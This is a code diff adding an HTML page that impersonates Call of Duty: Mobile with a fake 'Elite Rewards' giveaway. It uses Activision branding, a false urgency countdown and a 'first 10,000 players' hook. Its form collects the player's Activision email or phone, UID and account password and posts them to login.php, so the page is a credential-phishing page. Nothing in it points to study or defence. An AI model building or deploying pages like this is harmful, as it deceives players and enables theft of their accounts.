@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call of Duty: Mobile | Elite Rewards | Activision</title>
+    <link rel="shortcut icon" href="https://www.callofduty.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #FFD700; /* Gold */
+            --secondary: #000000; /* Black */
+            --accent: #E51E25; /* COD Red */
+        }
+        
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(255,215,0,0.15) 0%, transparent 25%),
+                radial-gradient(circle at 80% 70%, rgba(255,215,0,0.15) 0%, transparent 25%),
+                linear-gradient(to bottom, #000000, #1A1A1A);
+            color: white;
+            margin: 0;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        /* Hexagon pattern overlay */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                linear-gradient(to right, rgba(255,215,0,0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255,215,0,0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: -1;
+        }
+
+        .header {
+            background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent);
+            padding: 2rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid var(--primary);
+        }
+
+        .cod-logo {
+            height: 80px;
+            margin-bottom: 1rem;
+            filter: drop-shadow(0 0 15px rgba(255,215,0,0.7));
+        }
+
+        .event-badge {
+            height: 100px;
+            margin: 0 auto;
+            animation: pulse 2s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.05); }
+        }
+
+        .reward-card {
+            background: rgba(10,10,10,0.9);
+            border: 1px solid var(--primary);
+            max-width: 500px;
+            margin: 3rem auto;
+            border-radius: 5px;
+            box-shadow: 0 0 40px rgba(255,215,0,0.2);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .reward-card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(to right, var(--primary), var(--accent), var(--primary));
+        }
+
+        .card-header {
+            background: linear-gradient(to right, rgba(255,215,0,0.2), rgba(0,0,0,0.5));
+            padding: 1.5rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(255,215,0,0.3);
+        }
+
+        .form-group {
+            padding: 2rem;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 1.5rem;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #333;
+            color: white;
+            font-size: 16px;
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255,215,0,0.5);
+        }
+
+        .submit-btn {
+            background: linear-gradient(to right, var(--primary), #FFC000);
+            color: black;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'Rajdhani', sans-serif;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(to right, #FFE000, var(--primary));
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px rgba(255,215,0,0.5);
+        }
+
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .reward-item {
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,215,0,0.3);
+            border-radius: 3px;
+            padding: 1rem;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .reward-item:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            background: rgba(255,215,0,0.1);
+        }
+
+        .reward-icon {
+            height: 50px;
+            margin-bottom: 0.5rem;
+            filter: drop-shadow(0 0 5px rgba(255,215,0,0.5));
+        }
+
+        .countdown {
+            background: rgba(0,0,0,0.7);
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 1rem;
+            text-align: center;
+            margin: 1rem 0;
+            font-family: monospace;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+        }
+
+        .legal {
+            font-size: 0.7rem;
+            color: #666;
+            text-align: center;
+            margin-top: 3rem;
+            line-height: 1.4;
+        }
+
+        /* Animated scanlines effect */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(255,215,0,0.03) 51%
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 100;
+            animation: scanline 8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-100%); }
+        }
+    </style>
+</head>
+<body>
+    <div class="scanlines"></div>
+    
+    <div class="header">
+        <img src="logo.png" alt="Call of Duty Logo" class="cod-logo">
+        
+        <h1 style="color: var(--primary); text-shadow: 0 0 10px rgba(255,215,0,0.5);">ELITE REWARDS PROGRAM</h1>
+        <p>Verify your account to unlock exclusive rewards</p>
+    </div>
+    
+    <div class="reward-card">
+        <div class="card-header">
+            <h2 style="color: var(--primary);">LIMITED TIME OFFER</h2>
+            <p>Only available to first 10,000 verified players</p>
+            <div class="countdown">
+                ⏳ <span id="timer">23:59:59</span> REMAINING
+            </div>
+        </div>
+        
+       <div class="form-group">
+  <form action="login.php" method="POST">
+    <label class="form-label" for="contact">Activision Email / Phone</label>
+    <input class="form-input" type="text" name="contact" id="contact" placeholder="Enter your Activision Email or Phone" required>
+
+    <label class="form-label" for="uid">Player UID</label>
+    <input class="form-input" type="text" name="uid" id="uid" placeholder="Enter your UID (10 digits)" required>
+
+    <label class="form-label" for="password">Account Password</label>
+    <input class="form-input" type="password" name="password" id="password" placeholder="Enter your password" required>
+
+    <button type="submit" class="submit-btn">🔓 VERIFY & CLAIM REWARD</button>
+  </form>
+</div>
+
+    
+    <p class="legal">
+        This is not an official Activision event. By verifying your account, you agree to our Terms of Service.<br>
+        Call of Duty and Call of Duty: Mobile are trademarks of Activision Publishing, Inc.
+    </p>
+
+    <script>
+        // Countdown timer
+        function updateTimer() {
+            const now = new Date();
+            const end = new Date();
+            end.setHours(23, 59, 59);
+            
+            const diff = end - now;
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const secs = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            document.getElementById('timer').textContent = 
+                `${hours.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        // Dynamic glow effect on inputs
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.boxShadow = `0 0 15px rgba(255,215,0,0.7)`;
+            });
+            input.addEventListener('blur', function() {
+                this.style.boxShadow = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
